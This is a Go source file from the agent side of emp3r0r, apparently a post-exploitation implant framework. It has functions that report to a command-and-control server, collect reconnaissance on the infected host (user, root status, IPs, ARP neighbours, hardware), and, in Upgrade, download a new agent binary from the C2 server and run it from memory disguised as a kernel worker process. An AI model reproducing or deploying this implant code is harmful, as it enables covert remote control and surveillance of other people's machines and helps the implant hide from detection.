package agent

import (
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// is the agent alive?
// connect to emp3r0r_data.SocketName, send a message, see if we get a reply
func IsAgentAlive() bool {
	log.Println("Testing if agent is alive...")
	c, err := net.Dial("unix", emp3r0r_data.SocketName)
	if err != nil {
		log.Printf("Seems dead: %v", err)
		return false
	}
	defer c.Close()

	replyFromAgent := make(chan string, 1)
	reader := func(r io.Reader) {
		buf := make([]byte, 1024)
		for {
			n, err := r.Read(buf[:])
			if err != nil {
				return
			}
			replyFromAgent <- string(buf[0:n])
		}
	}

	// listen for reply from agent
	go reader(c)

	// send hello to agent
	for {
		_, err := c.Write([]byte("emp3r0r"))
		if err != nil {
			log.Print("write error:", err)
			break
		}
		if <-replyFromAgent == "emp3r0r" {
			log.Println("Yes it's alive")
			return true
		}
		time.Sleep(1e9)
	}

	return false
}

// Send2CC send TunData to CC
func Send2CC(data *emp3r0r_data.MsgTunData) error {
	var out = json.NewEncoder(emp3r0r_data.H2Json)

	err := out.Encode(data)
	if err != nil {
		return errors.New("Send2CC: " + err.Error())
	}
	return nil
}

// CollectSystemInfo build system info object
func CollectSystemInfo() *emp3r0r_data.SystemInfo {
	var info emp3r0r_data.SystemInfo
	osinfo := GetOSInfo()

	info.OS = fmt.Sprintf("%s %s (%s)", osinfo.Name, osinfo.Version, osinfo.Architecture)
	hostname, err := os.Hostname()
	if err != nil {
		log.Printf("Gethostname: %v", err)
		hostname = "unknown_host"
	}
	emp3r0r_data.AgentTag = util.GetHostID(emp3r0r_data.AgentUUID)
	info.Tag = emp3r0r_data.AgentTag // use hostid
	info.Hostname = hostname
	info.Version = emp3r0r_data.Version
	info.Kernel = util.GetKernelVersion()
	info.Arch = runtime.GOARCH
	info.CPU = util.GetCPUInfo()
	info.GPU = util.GetGPUInfo()
	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
	info.Hardware = util.CheckProduct()
	info.Container = CheckContainer()
	info.Transport = emp3r0r_data.Transport

	// have root?
	info.HasRoot = os.Geteuid() == 0

	// process
	info.Process = CheckAgentProcess()

	// user account info
	u, err := user.Current()
	if err != nil {
		log.Println(err)
		info.User = "Not available"
	}
	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)

	// is cc on tor?
	info.HasTor = tun.IsTor(emp3r0r_data.CCAddress)

	// has internet?
	info.HasInternet = tun.HasInternetAccess()

	// IP address?
	info.IPs = tun.IPa()

	// arp -a ?
	info.ARP = IPNeigh()

	return &info
}

func Upgrade() error {
	elfdata, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/agent", "")
	if err != nil {
		return err
	}

	procName := fmt.Sprintf("[kworker/%d:0H-kb%s]",
		util.RandInt(0, 8),
		util.RandStr(util.RandInt(3, 10)))
	return RunFromMemory(procName, elfdata)
}

func calculateReverseProxyPort() string {
	p, err := strconv.Atoi(emp3r0r_data.ProxyPort)
	if err != nil {
		log.Printf("WTF? emp3r0r_data.ProxyPort %s: %v", emp3r0r_data.ProxyPort, err)
		return "22222"
	}

	// reverseProxyPort
	rProxyPortInt := p + 1
	return strconv.Itoa(rProxyPortInt)
}
